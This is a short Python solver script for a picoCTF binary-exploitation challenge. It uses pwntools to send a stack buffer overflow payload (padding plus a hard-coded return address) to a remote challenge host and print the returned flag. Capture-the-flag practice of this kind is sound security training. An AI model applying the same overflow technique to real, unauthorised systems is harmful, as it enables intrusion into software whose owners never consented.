from syoch_ctf.pwn import SolverResult, auto_solver

import pwn

# elf = pwn.ELF("./vuln")


@auto_solver(
    local_executable="./vuln",
    remote_host="mysterious-sea.picoctf.net",
    remote_port=57323,
)
def solve(p: pwn.tube) -> SolverResult:
    p.recvuntil(b"Please enter your name: ")
    payload = b""
    payload += b"a" * 32
    payload += b"AAAAAAAA" * 1
    payload += (0x0000000000401256).to_bytes(8, "little")
    payload += b"0" * (128 - len(payload))
    p.send(payload)

    p.recvuntil(b"our service.")
    flag = p.recvall(128).decode().strip()
    p.close()

    print(flag)

    return "SolverSuccess"
